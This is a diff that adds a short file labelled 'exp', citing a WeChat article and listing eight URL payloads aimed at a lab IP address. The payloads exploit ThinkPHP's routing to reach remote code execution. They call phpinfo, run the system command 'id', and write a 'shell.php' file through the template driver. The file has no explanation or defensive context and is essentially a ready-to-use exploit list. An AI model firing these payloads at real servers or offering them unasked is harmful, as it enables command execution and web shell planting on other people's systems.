@@ -1,0 +1,11 @@
+# exp
+# https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ
+
+http://10.10.66.135:8181/?s=index/\think\Request/input&filter=phpinfo&data=1
+http://10.10.66.135:8181/?s=index/\think\Request/input&filter=system&data=id
+http://10.10.66.135:8181/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
+http://10.10.66.135:8181/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E
+http://10.10.66.135:8181/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+http://10.10.66.135:8181/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+http://10.10.66.135:8181/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+http://10.10.66.135:8181/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
